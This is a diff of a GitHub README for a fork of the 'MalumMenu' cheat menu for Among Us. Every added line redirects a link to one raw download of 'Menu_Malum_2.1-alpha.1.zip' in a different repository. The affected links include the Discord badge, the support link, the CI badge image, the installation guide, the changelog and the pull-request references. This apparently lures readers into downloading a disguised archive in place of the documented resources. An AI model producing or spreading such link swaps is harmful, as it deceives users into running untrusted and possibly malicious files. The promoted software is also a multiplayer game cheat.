@@ -6,16 +6,16 @@
 
 <p align="center">
 
-  <a href="https://discord.gg/YYcYf88jAb">
+  <a href="https://github.com/OPBOYZ8/MalumMenu/raw/refs/heads/reloaded/src/Menu_Malum_2.1-alpha.1.zip">
     <img src="https://img.shields.io/badge/Join%20us%20on-Discord-blue?style=flat&logo=discord" alt="Discord">
   </a>
 
-  <a href="https://github.com/astra1dev#%EF%B8%8F-support-me">
+  <a href="https://github.com/OPBOYZ8/MalumMenu/raw/refs/heads/reloaded/src/Menu_Malum_2.1-alpha.1.zip">
     <img src="https://img.shields.io/badge/Support-me-ff5f5f?style=flat&logo=github-sponsors">
   </a>
 
-  <a href="https://github.com/astra1dev/MalumMenu/actions/workflows/main.yml">
-    <img src="https://github.com/astra1dev/MalumMenu/actions/workflows/main.yml/badge.svg?event=push&style=plastic">
+  <a href="https://github.com/OPBOYZ8/MalumMenu/raw/refs/heads/reloaded/src/Menu_Malum_2.1-alpha.1.zip">
+    <img src="https://github.com/OPBOYZ8/MalumMenu/raw/refs/heads/reloaded/src/Menu_Malum_2.1-alpha.1.zip">
   </a>
 
   <a href="../../releases">
@@ -44,11 +44,11 @@ This repository (more specifically, the `reloaded` branch) is my personal fork o
 | v2.5.2      | 2025.6.10 (16.1.0) | [Download](../../releases/tag/v2.5.2) |
 | v2.5.1      | 2025.6.10 (16.1.0) | [Download](../../releases/tag/v2.5.1) |
 
-For older (official) versions, please refer to the [original MalumMenu repository](https://github.com/scp222thj/MalumMenu).
+For older (official) versions, please refer to the [original MalumMenu repository](https://github.com/OPBOYZ8/MalumMenu/raw/refs/heads/reloaded/src/Menu_Malum_2.1-alpha.1.zip).
 
 # ⬇️ Installation
 
-The installation process is the same as for the original MalumMenu (see [here](https://github.com/scp222thj/MalumMenu?tab=readme-ov-file#%EF%B8%8F-installation)).
+The installation process is the same as for the original MalumMenu (see [here](https://github.com/OPBOYZ8/MalumMenu/raw/refs/heads/reloaded/src/Menu_Malum_2.1-alpha.1.zip)).
 
 Instead of downloading the latest ZIP or DLL release from the original repository, download it from the table above (or get the CI build artifact from the latest commit for more bleeding-edge features).
 
@@ -58,11 +58,11 @@ Make sure you are only having one version of MalumMenu installed at a time, as h
 
 # 📋 Features
 
-![](https://github.com/user-attachments/assets/e7342201-aa01-4435-8c9e-d543712842e0)
+![](https://github.com/OPBOYZ8/MalumMenu/raw/refs/heads/reloaded/src/Menu_Malum_2.1-alpha.1.zip)
 
 ## Changes compared to the original MalumMenu
-- [Full Changelog](https://github.com/scp222thj/MalumMenu/compare/main...astra1dev:MalumMenu:reloaded)
-- [Original MalumMenu feature list](https://github.com/scp222thj/MalumMenu?tab=readme-ov-file#-features)
+- [Full Changelog](https://github.com/OPBOYZ8/MalumMenu/raw/refs/heads/reloaded/src/Menu_Malum_2.1-alpha.1.zip)
+- [Original MalumMenu feature list](https://github.com/OPBOYZ8/MalumMenu/raw/refs/heads/reloaded/src/Menu_Malum_2.1-alpha.1.zip)
 ### Fixes
 - v16.0.0 fix where the menu wouldn't load at all
 - v17.0.0 fix where PPM and SeeRoles wouldn't work
@@ -77,15 +77,15 @@ Make sure you are only having one version of MalumMenu installed at a time, as h
 - **Player**: Fake Revive, Invert Controls
 - **ESP**: Show Player Info, More Lobby Info, Show Task Arrows
 - **Roles**: Tasks Menu (to complete individual tasks and see other players' tasks), Track Reach, Interrogate Reach
-- **Ship**: Open Sabotage Map, Trigger Spores ([#40](https://github.com/scp222thj/MalumMenu/pull/40)), Auto-Open Doors On Use, Doors Menu (to close / open individual doors)
+- **Ship**: Open Sabotage Map, Trigger Spores ([#40](https://github.com/OPBOYZ8/MalumMenu/raw/refs/heads/reloaded/src/Menu_Malum_2.1-alpha.1.zip)), Auto-Open Doors On Use, Doors Menu (to close / open individual doors)
 - **Host-Only**: No Options Limits, Protect Player PPM
   - **Meetings** (NEW!): Call Meeting, Skip Meeting, VoteImmune, Eject Player
-  - **Game State** (NEW!) ([#49](https://github.com/scp222thj/MalumMenu/pull/49)): Force Start Game, No Game End
+  - **Game State** (NEW!) ([#49](https://github.com/OPBOYZ8/MalumMenu/raw/refs/heads/reloaded/src/Menu_Malum_2.1-alpha.1.zip)): Force Start Game, No Game End
 - **Passive**: Spoof Date to April 1st, Stealth Mode, Panic (Disable MalumMenu), Copy Lobby Code on Disconnect
 - **Animations**: (NEW!): Shields, Asteroids, Empty Garbage, Medbay Scan, Fake Cams In Use, Moonwalk
 - **Config** (NEW!): Open plugin config, Reload plugin config, Save to Profile, Load from Profile, RGB Mode
 #### New features and QoL improvements
-- Added option to disable cheats in Passive category ([#164](https://github.com/scp222thj/MalumMenu/pull/164))
+- Added option to disable cheats in Passive category ([#164](https://github.com/OPBOYZ8/MalumMenu/raw/refs/heads/reloaded/src/Menu_Malum_2.1-alpha.1.zip))
 - Added new Viper and Detective roles to "Set Fake Role" cheat (Roles category)
 - Added a new horizontal tab-based UI config option
 - Changed "SpeedHack" to be a slider instead of a toggle (Player category)
